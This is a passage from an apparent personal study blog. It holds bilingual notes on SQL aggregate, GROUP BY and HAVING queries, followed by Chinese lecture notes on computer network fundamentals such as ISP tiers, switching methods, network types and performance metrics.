<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.name, S.gpa, S.age <span class="operator">*</span> <span class="number">2</span> <span class="keyword">AS</span> A2</span><br><span class="line"><span class="keyword">FROM</span> Students S</span><br><span class="line"><span class="keyword">WHERE</span> S.dept <span class="operator">=</span> <span class="string">&#x27;CS&#x27;</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> S.gpa <span class="keyword">DESC</span>, S.name <span class="keyword">ASC</span>, a2;</span><br><span class="line">LIMIT <span class="number">3</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>限制输出为几行</li>
</ul>
<h5 id="Aggregates"><a class="header-anchor" href="#Aggregates">¶</a>Aggregates</h5>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> [<span class="keyword">DISTINCT</span>] <span class="built_in">AVG</span>(S.gpa)</span><br><span class="line"><span class="keyword">FROM</span> students S</span><br><span class="line"><span class="keyword">WHERE</span> S.dept <span class="operator">=</span> <span class="string">&#x27;CS&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>AVG()：计算平均值</p>
</li>
<li>
<p>Before producing output, compute a summary(a.k.a. an aggregate) of some arithmetic expression</p>
</li>
<li>
<p>produce 1 row of output -with one column in this case</p>
</li>
<li>
<p>other aggregates: SUM, COUNT, MAX, MIN</p>
</li>
</ul>
<h5 id="GROUP-BY"><a class="header-anchor" href="#GROUP-BY">¶</a>GROUP BY</h5>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> [<span class="keyword">DISTINCT</span>] <span class="built_in">AVG</span>(S.gpa), S.dept</span><br><span class="line"><span class="keyword">FROM</span> students S</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> S.dept</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>GROUP BY：按照GROUP BY后面列出的列，进行分组</p>
</li>
<li>
<p>Partition table into groups with same GROUP BY column values - Can group by a list of columns    将表按照具有相同GROUP BY列值的组进行分区，可以根据一列或多列进行分组</p>
</li>
<li>
<p>Produce an aggregate result per group -Cardinality of output = # of distinct group values   为每个组生成一个聚合结果，输出的基数等于不同组值的数量</p>
</li>
<li>
<p>Note: can put grouping columns in SELECT list   可以将分组放入SELECT列表</p>
</li>
</ul>
<h5 id="HAVING"><a class="header-anchor" href="#HAVING">¶</a>HAVING</h5>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> [<span class="keyword">DISTINCT</span>] <span class="built_in">AVG</span>(S.gpa), S.dept</span><br><span class="line"><span class="keyword">FROM</span> students S</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> S.dept</span><br><span class="line"><span class="keyword">HAVING</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="operator">&gt;</span> <span class="number">2</span></span><br></pre></td></tr></table></figure>
<ul>
<li>The HAVING predicate filters groups  用于过滤分组后的结果</li>
<li>HAVING is applied after grouping and aggregation    HAVING子句在分组和聚合计算完成后应用       -Hence can contain anything that could go in the SELECT list  因此可以包含选择列表中的任何内容</li>
<li>HAVING can only be used in aggregate queries   HAVING只能用在聚合查询中</li>
<li>it’s an optional clause    可选非必须</li>
</ul>
<h5 id="Putting-it-all-together"><a class="header-anchor" href="#Putting-it-all-together">¶</a>Putting it all together</h5>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.dept, <span class="built_in">AVG</span>(S.gpa), <span class="built_in">COUNT</span>(<span class="operator">*</span>)</span><br><span class="line"><span class="keyword">FROM</span> students S</span><br><span class="line"><span class="keyword">WHERE</span> S.gender <span class="operator">=</span> <span class="string">&#x27;F&#x27;</span></span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> S.dept</span><br><span class="line"><span class="keyword">HAVING</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="operator">&gt;=</span> <span class="number">2</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> S.dept</span><br></pre></td></tr></table></figure>
<h5 id="DISTINCT-Aggregates"><a class="header-anchor" href="#DISTINCT-Aggregates">¶</a>DISTINCT Aggregates</h5>
<p>DISTINCT can be used inside or outside of aggregate function, but have different meanings</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="keyword">DISTINCT</span> S.name)</span><br><span class="line"><span class="keyword">FROM</span> Students S</span><br><span class="line"><span class="keyword">WHERE</span> S.dept <span class="operator">=</span> <span class="string">&#x27;CS&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> <span class="built_in">COUNT</span>(S.name)</span><br><span class="line"><span class="keyword">FROM</span> Students S</span><br><span class="line"><span class="keyword">WHERE</span> S.dept <span class="operator">=</span> <span class="string">&#x27;CS&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>第一个：在计数之前先把所有重复项移除   相当于只计算有多少中不同项</li>
<li>第二个：先计数，再移除重复项   相当于计算所有项</li>
</ul>
<h5 id="What-Is-This-Asking-For"><a class="header-anchor" href="#What-Is-This-Asking-For">¶</a>What Is This Asking For?</h5>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.name, <span class="built_in">AVG</span>(S.gpa)</span><br><span class="line"><span class="keyword">FROM</span> Students S</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> S.dept</span><br></pre></td></tr></table></figure>
<ul>
<li><code>illegal query</code>   因为<code>S.name</code>没有被包含在<code>GROUP BY</code> 子句中，也没有被用在聚合函数中。数据库不知道应该选择哪个学生的姓名来显示，因为可能有多个学生具有相同的系别（<code>S.dept</code>）。</li>
</ul>
<h5 id="SQL-DML-General-Basic-Single-Table-Queries"><a class="header-anchor" href="#SQL-DML-General-Basic-Single-Table-Queries">¶</a>SQL DML: General Basic Single-Table Queries</h5>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> [<span class="keyword">DISTINCT</span>] <span class="operator">&lt;</span><span class="keyword">column</span> expression list<span class="operator">&gt;</span> <span class="keyword">FROM</span> <span class="operator">&lt;</span>single <span class="keyword">table</span><span class="operator">&gt;</span></span><br><span class="line">[<span class="keyword">WHERE</span> <span class="operator">&lt;</span>predictable<span class="operator">&gt;</span>]</span><br><span class="line">[<span class="keyword">GROUP</span> <span class="keyword">BY</span> <span class="operator">&lt;</span><span class="keyword">column</span> list<span class="operator">&gt;</span>]</span><br><span class="line">[<span class="keyword">HAVING</span> <span class="operator">&lt;</span>predicate<span class="operator">&gt;</span>]</span><br><span class="line">[<span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="operator">&lt;</span><span class="keyword">column</span> list<span class="operator">&gt;</span>]</span><br><span class="line">[LIMIT <span class="operator">&lt;</span><span class="type">integer</span><span class="operator">&gt;</span>]</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>notes</category>
        <category>SQL notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>Database</tag>
      </tags>
  </entry>
  <entry>
    <title>【计网（湖科大版）】第一章 概述</title>
    <url>/2024/09/04/CS_Notes/Computer%20Network/%E3%80%90%E8%AE%A1%E7%BD%91%EF%BC%88%E6%B9%96%E7%A7%91%E5%A4%A7%E7%89%88%EF%BC%89%E3%80%91%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E6%A6%82%E8%BF%B0/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<p><a href="https://www.bilibili.com/video/BV1c4411d7jb/?spm_id_from=333.999.0.0&amp;vd_source=3f0983ef34615b702fec513c41e55a64">计算机网络微课堂（有字幕无背景音乐版）_哔哩哔哩_bilibili</a></p>
<p><a href="https://blog.csdn.net/hushhw/article/details/78985307">《计算机网络》复习笔记_计算机网络笔记-CSDN博客</a></p>
<h2 id="因特网概述"><a class="header-anchor" href="#因特网概述">¶</a>因特网概述</h2>
<h3 id="网络、互联网和因特网"><a class="header-anchor" href="#网络、互联网和因特网">¶</a>网络、互联网和因特网</h3>
<h4 id="概念"><a class="header-anchor" href="#概念">¶</a>概念</h4>
<ul>
<li>
<p>网络Network：由若干<strong>结点Node</strong>和连接这些结点的<strong>链路Link</strong>组成</p>
<ul>
<li>举例：一台交换机、笔电、打印机、台式电脑分别充当结点，它们之间有链路</li>
</ul>
</li>
<li>
<p>多个网络还可以通过路由器互连起来，就构成了覆盖范围更大的网络——互联网。互联网是“网络的网络”</p>
</li>
<li>
<p>因特网Internet是世界上最大的互联网络</p>
</li>
<li>
<p>关系：网络–多个连接组成-→互联网–最大的互联网-→因特网</p>
</li>
</ul>
<h4 id="名词区别"><a class="header-anchor" href="#名词区别">¶</a>名词区别</h4>
<ul>
<li><code>internet</code>：是通用名词，泛指由多个计算机网络互连而成的网络。这些网络之间的通信协议可以是任意的</li>
<li><code>Internet</code>：是专用名词，指当前全球最大的、开放的、由众多网络相互连接而成的特定计算机网络。采用<code>TCP/IP</code>协议族作为通行规则</li>
</ul>
<h3 id="因特网发展的三个阶段"><a class="header-anchor" href="#因特网发展的三个阶段">¶</a>因特网发展的三个阶段</h3>
<ol>
<li>从单个网络ARPANET向互联网</li>
<li>逐步建成三级结构的因特网</li>
<li>逐步形成了多层次ISP结构的因特网</li>
</ol>
<h4 id="因特网服务提供者ISP-Internet-Service-Provider"><a class="header-anchor" href="#因特网服务提供者ISP-Internet-Service-Provider">¶</a>因特网服务提供者ISP(Internet Service Provider)</h4>
<ul>
<li>用户是通过ISP接入因特网</li>
<li>ISP可从因特网管理机构申请到成块的IP地址，同时拥有通信线路以及路由器等连网设备</li>
<li>用户通过缴费获得ISP提供的IP地址，因特网上的主机必须有IP地址才能进行通信</li>
<li>我国主要ISP：中国电信、中国联通、中国移动</li>
</ul>
<h4 id="基于ISP的三层结构的因特网"><a class="header-anchor" href="#基于ISP的三层结构的因特网">¶</a>基于ISP的三层结构的因特网</h4>
<ul>
<li>服务的覆盖面积大小、所拥有的IP地址数量不同→ISP分为不同层次</li>
</ul>
<ol>
<li>第一层ISP：
<ol>
<li>服务面积最大，通常成为因特网主干网；</li>
<li>一般能够覆盖国际性区域范围；</li>
<li>拥有高速链路和交换设备</li>
<li>第一层ISP之间直接互联</li>
</ol>
</li>
<li>第二层ISP：
<ol>
<li>第二层ISP和一些大公司→是第一层ISP的用户</li>
<li>通常具有区域性或国家性覆盖规模</li>
<li>与少数第一层ISP相连接</li>
</ol>
</li>
<li>第三层ISP：
<ol>
<li>又称为本地ISP，是第二层ISP的用户</li>
<li>只拥有本地范围的网络</li>
<li>用户为一般的校园网/企业网，住宅用户和无线移动用户</li>
</ol>
</li>
</ol>
<ul>
<li>一个ISP可以方便地在因特网拓扑上增添新的层次和分支</li>
</ul>
<h3 id="因特网的标准化工作"><a class="header-anchor" href="#因特网的标准化工作">¶</a>因特网的标准化工作</h3>
<ul>
<li>面向公众
<ul>
<li>因特网所以RFC(Request For Comments)技术文档都可从因特网上免费下载</li>
<li>anyone can comment / advise （有点懒得打中文所以编了一句）</li>
</ul>
</li>
</ul>
<h3 id="因特网的组成"><a class="header-anchor" href="#因特网的组成">¶</a>因特网的组成</h3>
<ul>
<li>
<p>边缘部分</p>
<ul>
<li>
<p>由所有连接在因特网上的<strong>主机</strong>组成</p>
</li>
<li>
<p><strong>用户直接使用</strong>这部分</p>
</li>
<li>
<p>用来进行<strong>通信</strong>（传送数据、音频或视频）和<strong>资源共享</strong></p>
</li>
<li>
<p>边缘部分中的主机，可以是：台式电脑 / 大型服务器 / 笔电 / 智能手机 / 智能手表 / 物联网智能硬件（如：空气质量监测仪，智能摄像头）</p>
</li>
</ul>
</li>
<li>
<p>核心部分</p>
<ul>
<li>由<strong>大量网络</strong>和连接这些网络的<strong>路由器</strong>组成</li>
<li>此部分<strong>为边缘部分提供服务</strong>（提供连通性和交换）</li>
</ul>
</li>
<li>
<p>在<strong>核心</strong>部分起特殊作用的是**<u>路由器</u>**</p>
<ul>
<li>路由器是一种专用计算机，但不称为主机</li>
<li>是实现分组交换的关键构件，任务是**<u>转发收到的分组</u>**→是网络<u>核心部分最重要的功能</u></li>
</ul>
</li>
</ul>
<h2 id="三种交换方式：电路交换、分组交换、报文交换"><a class="header-anchor" href="#三种交换方式：电路交换、分组交换、报文交换">¶</a>三种交换方式：电路交换、分组交换、报文交换</h2>
<h3 id="电路交换-Circuit-Switching"><a class="header-anchor" href="#电路交换-Circuit-Switching">¶</a>电路交换 (Circuit Switching)</h3>
<h4 id="示例：电话和电话交换机。"><a class="header-anchor" href="#示例：电话和电话交换机。">¶</a>示例：电话和电话交换机。</h4>
<ul>
<li>
<p>可将电话交换机看作有多个开关的开关器，可将需要通信的任意两部电话的电话线按需接通，大大减少了电话机连线数量；</p>
</li>
<li>
<p>当电话数量增多，就需要更多彼此连接的电话交换机来完成全网的交换任务；</p>
</li>
<li>
<p>以这样的方法，就构成了覆盖全世界的电信网</p>
</li>
<li>
<p>电话交换机接通电话线的方式称为<strong>电路交换</strong>；</p>
</li>
<li>
<p>从通信资源的分配角度来看，<strong>交换</strong>（Switching）就是按照某种方式动态地分配传输线路的资源</p>
</li>
<li>
<p>此处缺一张图    <a href="https://www.bilibili.com/video/BV1c4411d7jb/?p=3&amp;spm_id_from=pageDriver&amp;vd_source=3f0983ef34615b702fec513c41e55a64">1.3 三种交换方式：电路交换、分组交换和报文交换_哔哩哔哩_bilibili</a>    02:32</p>
<ul>
<li><strong>用户线</strong>归电话用户专用</li>
<li>电话交换机之间拥有的大量话路的<strong>中继线</strong>则是许多用户共享</li>
</ul>
</li>
<li>
<p><strong>电路交换的三个步骤</strong>：</p>
<ol>
<li>建立连接（分配通信资源）</li>
<li>通话（一直占用通信资源）</li>
<li>释放连接（归还通信资源）</li>
</ol>
</li>
<li>
<p>当使用电路交换来传送计算机数据时，其线路的<u>传输效率往往很低</u></p>
<ul>
<li>例如：用户在编辑一份文件，其通信资源一直被占用但未使用，造成资源浪费，其他用户无法获得资源，造成效率降低</li>
<li>因此计算机网络往往采取分组交换，而不是电路交换</li>
</ul>
</li>
</ul>
<h3 id="❤❤分组交换-Packet-Switching-❤❤"><a class="header-anchor" href="#❤❤分组交换-Packet-Switching-❤❤">¶</a>❤❤分组交换 (Packet Switching)❤❤</h3>
<ul>
<li>
<p>把表示要发送的消息的整块数据称为一个<strong>报文</strong></p>
<ul>
<li>发送报文之前，先把较长的报文划分为一个个更小的等长的<strong>数据段</strong></li>
<li>在每个数据段前面加上一些由必要的控制信息组成的<strong>首部</strong>，就构成了一个<strong>分组</strong>，也可简称为<strong>包</strong>，首部因此也可称为<strong>包头</strong></li>
<li><strong>首部</strong>的作用：
<ol>
<li>包含了分组的目的地址
<ol>
<li>分组交换机收到一个分组后，先暂时存储分组，检查其首部</li>
<li>按照首部中的目的地址进行查表转发，找到合适的转发接口</li>
<li>通过该接口将分组转发给下一个分组交换机</li>
<li>目的地址的主机收到分组后，去掉其首部，将各数据段组合还原出原始报文</li>
</ol>
</li>
</ol>
</li>
</ul>
</li>
<li>
<p>【发送方】：构造分组、发送分组</p>
</li>
<li>
<p>【路由器】：缓存分组、转发分组</p>
</li>
<li>
<p>【接收方】：接受分组、还原报文</p>
</li>
<li>
<p>报文交换中的交换结点也采用存储转发方式</p>
<ul>
<li>但报文交换对报文的大小没有限制→要求交换结点需要有较大的缓存空间</li>
</ul>
</li>
<li>
<p>报文交换（Message Switching）主要用于早期的电报通信网</p>
</li>
</ul>
<h3 id="电路交换、报文交换、分组交换的对比"><a class="header-anchor" href="#电路交换、报文交换、分组交换的对比">¶</a>电路交换、报文交换、分组交换的对比</h3>
<ul>
<li><a href="https://www.bilibili.com/video/BV1c4411d7jb/?p=3&amp;spm_id_from=pageDriver&amp;vd_source=3f0983ef34615b702fec513c41e55a64">1.3 三种交换方式：电路交换、分组交换和报文交换_哔哩哔哩_bilibili</a>    09:09</li>
</ul>
<h4 id="电路交换"><a class="header-anchor" href="#电路交换">¶</a>电路交换</h4>
<ul>
<li>通信前：首先建立连接</li>
<li>然后进行数据传送</li>
<li>数据传送结束：释放连接，归还建立连接所占用的通信线路资源</li>
<li>一旦建立连接：
<ul>
<li>中间各结点交换机就是<strong>直通</strong>形式的</li>
<li><strong>比特流直达终点</strong></li>
</ul>
</li>
</ul>
<h4 id="报文交换"><a class="header-anchor" href="#报文交换">¶</a>报文交换</h4>
<ul>
<li>可以随时发送报文，而不需要事先建立连接</li>
<li>整个报文先传送到相邻结点交换机，<u>全部存储下来</u>后进行查表转发，转发到下一个结点交换机</li>
<li><u>整个报文</u>需要在各结点交换机上进行存储转发</li>
<li>由于不限制报文的大小，需要各结点交换机都具有较大的缓存空间</li>
</ul>
<h4 id="分组交换"><a class="header-anchor" href="#分组交换">¶</a>分组交换</h4>
<ul>
<li>可以随时发送分组，而不需要事先建立连接</li>
<li>构成原始报文的一个个分组，<u>依次</u>在结点交换机上存储转发</li>
<li>各结点交换机在<u>发送</u>分组的<u>同时，还缓存</u>接收到的分组</li>
<li>构成原始报文的一个个<u>分组</u>，在各结点交换机上进行存储转发</li>
<li><strong>优点</strong>：相比报文交换，减少了转发时延
<ul>
<li>还可避免过长的报文长时间占用链路</li>
<li>也有利于进行差错控制</li>
</ul>
</li>
</ul>
<h4 id="总结"><a class="header-anchor" href="#总结">¶</a>总结</h4>
<table>
<thead>
<tr>
<th>电路交换的优点</th>
<th></th>
<th>缺点</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>1）通信时延小</td>
<td>通信线路为通信双方用户专用，数据直达，在传输大量数据时优势明显</td>
<td>1）建立连接时间长</td>
<td></td>
</tr>
<tr>
<td>2）有序传输</td>
<td>通信双方只有一条专用的通信线路，不存在数据失序问题</td>
<td>2）线路独占，使用效率低</td>
<td>线路一旦建立，就被通信双方独占，即使线路空闲，也不能供其他用户使用</td>
</tr>
<tr>
<td>3）没有冲突</td>
<td>不同通信双方拥有不同的信道，不会出现争用物理信道的情况</td>
<td>3）灵活性差</td>
<td>连接所建立的物理通路的任何一点出现故障，就必须重新拨号建立新的连接，不利于紧急重要的通信</td>
</tr>
<tr>
<td>4）适用范围广</td>
<td>同时适用于传输模拟信号和数字信号</td>
<td>4）难以规格化</td>
<td>电路交换数据直达，不同类型、不同规格、不同速率的终端很难相互进行通信，也难以在通信过程中进行差错控制</td>
</tr>
<tr>
<td>5）实时性强</td>
<td>∵通信时延小</td>
<td></td>
<td></td>
</tr>
<tr>
<td>6）控制简单</td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>报文交换的优点</th>
<th></th>
<th>缺点</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>1）无需建立连接</td>
<td>不存在建立连接的时延，可以随时发送报文</td>
<td>1）有转发时延</td>
<td>在结点交换机上存储转发</td>
</tr>
<tr>
<td>2）动态分配线路</td>
<td>发送方把报文传送给结点交换机时，结点交换机先存储整个报文，然后选择一条合适的空闲线路发送报文</td>
<td>2）需要较大的存储缓存空间</td>
<td>需要存储整个报文</td>
</tr>
<tr>
<td>3）提高线路可靠性</td>
<td>某条传输路径发生故障，会重新选择另一条路径传输</td>
<td>3）需要传输额外的信息量</td>
<td>报文需要携带目的地址、源地址等</td>
</tr>
<tr>
<td>4）提高线路利用率</td>
<td>通信双方在不同的时间分段占用物理线路</td>
<td></td>
<td></td>
</tr>
<tr>
<td>5）提供多目标服务</td>
<td>一个报文可以同时发送给多个目的地址</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<ul>
<li>【❤❤❤❤❤】分组交换</li>
</ul>
<table>
<thead>
<tr>
<th>分组交换的优点</th>
<th></th>
<th></th>
<th>缺点</th>
</tr>
</thead>
<tbody>
<tr>
<td>1）无需建立连接</td>
<td>可随时发送分组</td>
<td>1）引起了转发时延</td>
<td>要加上存储转发的过程</td>
</tr>
<tr>
<td>2）线路利用率高</td>
<td>在不同时间分段部分占用物理线路</td>
<td>2）需要传输额外的信息量</td>
<td>每个数据块加上源地址、目的地址等信息</td>
</tr>
<tr>
<td>3）简化存储管理</td>
<td>（相对于报文交换）因为分组长度固定，相应的缓冲区大小也固定</td>
<td>3）对于数据报服务，存在失序、丢失或重复分组的问题；对于虚电路服务，存在呼叫建立、数据传输和虚电路释放三个过程</td>
<td>分组到达目的结点，需要重新还原成报文</td>
</tr>
<tr>
<td>4）加速传输</td>
<td>分组是逐个传输，使得后一个分组的存储操作与前一个分组的转发操作可以同时进行</td>
<td></td>
<td></td>
</tr>
<tr>
<td>5）减少了出错概率和重发数据量</td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<h2 id="计算机网络的定义和分类"><a class="header-anchor" href="#计算机网络的定义和分类">¶</a>计算机网络的定义和分类</h2>
<h3 id="计算机网络的定义"><a class="header-anchor" href="#计算机网络的定义">¶</a>计算机网络的定义</h3>
<ul>
<li>最简单的定义：一些<strong>互</strong>相<strong>连</strong>接的、<strong>自治</strong>的计算机的<strong>集合</strong>
<ul>
<li><strong>互连</strong>：是指计算机之间可以通过有线或无线的方式进行数据通信</li>
<li><strong>自治</strong>：是指独立的计算机，有自己的硬件和软件，可以单独运行使用</li>
<li><strong>集合</strong>：是指至少需要两台计算机</li>
</ul>
</li>
<li>较好的定义：计算机网络主要是由一些<strong>通用的、可编程的硬件互连</strong>而成的，而这些硬件并非专门用来实现某一特定目的（例如：传送数据或视频信号）这些可编程的硬件能够用来<strong>传送多种不同类型的数据</strong>，并能<strong>支持广泛的和日益增长的应用</strong>
<ul>
<li>定义表明：
<ul>
<li>计算机网络所连接的硬件，并不限于一般的计算机，而是包括了智能手机等智能硬件</li>
<li>计算机网络并非专门用来传送数据，而是能够支持很多种的应用（包括今后可能出现的）</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="计算机网络的分类"><a class="header-anchor" href="#计算机网络的分类">¶</a>计算机网络的分类</h3>
<ul>
<li>从不同角度可以分类</li>
</ul>
<table>
<thead>
<tr>
<th>按交换技术分类</th>
<th>按使用者分类</th>
<th>按传输介质分类</th>
</tr>
</thead>
<tbody>
<tr>
<td>电路交换网络</td>
<td>公用网</td>
<td>有线网络</td>
</tr>
<tr>
<td>报文交换网络</td>
<td>专用网</td>
<td>无线网</td>
</tr>
<tr>
<td>分组交换网络</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>按覆盖范围分类（需要记住英文缩写）</th>
<th>覆盖范围</th>
<th>地位</th>
<th>任务</th>
</tr>
</thead>
<tbody>
<tr>
<td>广域网WAN</td>
<td>几十公里~几千公里，可覆盖一个国家、地区、甚至跨越几个洲，因而有时也称为远程网</td>
<td>因特网的核心部分</td>
<td>为核心路由器提供远距离（如跨越不同国家的）高速连接</td>
</tr>
<tr>
<td>城域网MAN</td>
<td>一个城市，可跨越几个街区甚至整个城市，作用范围5~50公里</td>
<td>通常作为城市骨干网，现代城市的信息服务基础设施</td>
<td>互连大量企业、机构和校园局域网，有趋势将传统的电信服务、有线电视服务和互联网服务融为一体</td>
</tr>
<tr>
<td>局域网LAN</td>
<td>地理上局限在较小范围，如一个实验室、一幢楼或一个校园内，距离一般在一公里左右</td>
<td>通常由某个单位单独拥有、使用和维护</td>
<td>一般用微型计算机或工作站通过高速通信线路相连，速率在10Mbit/s以上</td>
</tr>
<tr>
<td>个域网PAN</td>
<td>大约10米</td>
<td></td>
<td>在个人工作的地方把属于个人使用的电子设备用无线技术连接起来的网络，因此通常也成为无线个人区域网WPAN</td>
</tr>
</tbody>
</table>
<ul>
<li>注意：若<strong>中央处理机之间的距离非常近</strong>（1米的数量级甚至更小），则一般就称之为<strong>多处理机系统</strong>，而不称为计算机网络</li>
</ul>
<table>
<thead>
<tr>
<th>按拓扑结构分类</th>
<th>结构</th>
<th>优点</th>
<th>缺点</th>
</tr>
</thead>
<tbody>
<tr>
<td>总线型网络</td>
<td>使用单根传输线把计算机连接起来</td>
<td>建网容易、增减结点方便、节省线路</td>
<td>重负载时通信效率不高，总线任意一处出现故障则全网瘫痪</td>
</tr>
<tr>
<td>星型网络</td>
<td>将每个计算机都以单独的线路与中央设备（早期是计算机，后来时集线器，现在一般是交换机 / 路由器）相连</td>
<td>便于网络的集中控制和管理，因为端用户之间的通信必须经过中央设备</td>
<td>成本高，中央设备对故障敏感</td>
</tr>
<tr>
<td>环形网络</td>
<td>将所有计算机的网络接口连接成一个环（典型例子：令牌环局域网），环可以是单环 / 双环，环中信号单向传输</td>
<td></td>
<td></td>
</tr>
<tr>
<td>网状型网络</td>
<td>每个结点至少由两条路径与其他结点相连，多用在广域网中</td>
<td>可靠性高</td>
<td>控制复杂、线路成本高</td>
</tr>
</tbody>
</table>
<ul>
<li>以上四种基本的网络拓扑还可以互连为更复杂的网络</li>
</ul>
<h2 id="计算机网络的性能指标"><a class="header-anchor" href="#计算机网络的性能指标">¶</a>计算机网络的性能指标</h2>
<blockquote>
<p>速率</p>
<p>带宽</p>
<p>吞吐量</p>
<p>时延</p>
<p>时延带宽积</p>
<p>往返时间</p>
<p>利用率</p>
<p>丢包率</p>
</blockquote>
<h3 id="（前置知识）比特"><a class="header-anchor" href="#（前置知识）比特">¶</a>（前置知识）比特</h3>
<ul>
<li>是计算机中数据量的单位</li>
<li>一比特就是二进制数字中的一个1或0</li>
</ul>
<h4 id="常用数据量单位"><a class="header-anchor" href="#常用数据量单位">¶</a>常用数据量单位</h4>
<ul>
<li>
<p><code>8 bit = 1 Byte</code>  一字节=八比特</p>
</li>
<li>
<p><code>KB = 2^10 B</code></p>
</li>
<li>
<p><code>MB = K * KB = 2^10 * 2^10 B = 2^20 B</code></p>
</li>
<li>
<p><code>GB = K * MB = 2^10 * 2^20 B = 2^30 B</code></p>
</li>
<li>
<p><code>TB = K * GB = 2^10 * 2^30 B = 2^40 B</code></p>
</li>
<li>
<p>使用U盘/硬盘时发现：操作系统给出的容量与厂家标称的容量不同</p>
<ul>
<li>例如：标称250GB，但是操作系统给出容量为232.8GB</li>
<li><code>(250 * 10^9) / 2^30 ≈ 232.8 (GB)</code></li>
</ul>
</li>
</ul>
<h3 id="速率"><a class="header-anchor" href="#速率">¶</a>速率</h3>
<ul>
<li>连接在计算机网络上的主机在数字信道上传送比特的速率，也成为<strong>比特率</strong>或<strong>数据率</strong></li>
</ul>
<h4 id="常用数据率单位"><a class="header-anchor" href="#常用数据率单位">¶</a>常用数据率单位</h4>
<ul>
<li>
<p><code>bit/s  (b/s, bps)</code></p>
</li>
<li>
<p><code>kb/s = 10^3 b/s (bps)</code></p>
</li>
<li>
<p><code>Mb/s = k * kb/s = 10^3 * 10^3  b/s = 10^6 b/s (bps)</code></p>
</li>
<li>
<p><code>Gb/s = k * Mb/s = 10^3 * 10^6  b/s = 10^9 b/s (bps)</code></p>
</li>
<li>
<p><code>Tb/s = k * Gb/s = 10^3 * 10^9  b/s = 10^12 b/s (bps)</code></p>
</li>
<li>
<p>一道例题：<a href="https://www.bilibili.com/video/BV1c4411d7jb/?p=5&amp;spm_id_from=pageDriver&amp;vd_source=3f0983ef34615b702fec513c41e55a64">1.5 计算机网络的性能指标（1）_哔哩哔哩_bilibili</a>    05:48</p>
</li>
<li>
<p>第二道例题：07:30</p>
</li>
</ul>
<h3 id="带宽"><a class="header-anchor" href="#带宽">¶</a>带宽</h3>
<h4 id="带宽在模拟信号系统中的意义"><a class="header-anchor" href="#带宽在模拟信号系统中的意义">¶</a>带宽在模拟信号系统中的意义</h4>
<ul>
<li><strong>信号</strong>所包含的各种不同频率成分所占据的<strong>频率范围</strong></li>
<li>单位：Hz（kHz，MHz，GHz）</li>
<li>例如：在传统通信线路上传送的电话信号的标准带宽为3.1kHz，范围从300Hz到3.4kHz，这是话音的主要成分的频率范围</li>
</ul>
<h4 id="带宽在计算机网络中的意义"><a class="header-anchor" href="#带宽在计算机网络中的意义">¶</a>带宽在计算机网络中的意义</h4>
<ul>
<li>用来表示网络的<strong>通信线路</strong>所能传送数据的能力，因此网络带宽表示在单位时间内从网络中的某一点到另一点所能通过的“<strong>最高数据率</strong>”</li>
<li>单位：b/s （kb/s, Mb/s, Gb/s, Tb/s）</li>
</ul>
<h4 id="带宽的两种描述"><a class="header-anchor" href="#带宽的两种描述">¶</a>带宽的两种描述</h4>
<ul>
<li>“带宽”的两种表述之间有着密切的联系</li>
<li>一条通信线路的“<strong>频率宽度</strong>”越宽，其所传输数据的“<strong>最高数据率</strong>”也越高</li>
</ul>
<h3 id="吞吐量"><a class="header-anchor" href="#吞吐量">¶</a>吞吐量</h3>
<ul>
<li>吞吐量表示在<strong>单位时间内通过某个网络（或信道、接口）的数据量</strong></li>
<li>吞吐量<strong>受网络的带宽或额定速率的限制</strong></li>
</ul>
<h3 id="时延"><a class="header-anchor" href="#时延">¶</a>时延</h3>
<ul>
<li>
<p>分组从源主机传送给目的主机的过程中产生时延的地方：</p>
<ul>
<li>源主机将分组发往传输线路→<strong>发送时延</strong></li>
<li>代表分组的电信号在链路上传输→<strong>传播时延</strong></li>
<li>路由器收到分组后，对其进行存储转发→<strong>处理时延</strong></li>
</ul>
</li>
<li>
<p>源主机和目的主机之间的路径会由多段链路和多个路由器构成，因此会有多个<strong>传播时延</strong>和<strong>处理时延</strong></p>
</li>
<li>
<p>网络时延由【<strong>发送时延】【传播时延】【处理时延</strong>】构成</p>
<ul>
<li><code>【发送时延】= 【分组长度 (b) 】 / 【发送速率 (b / s) 】</code>
<ul>
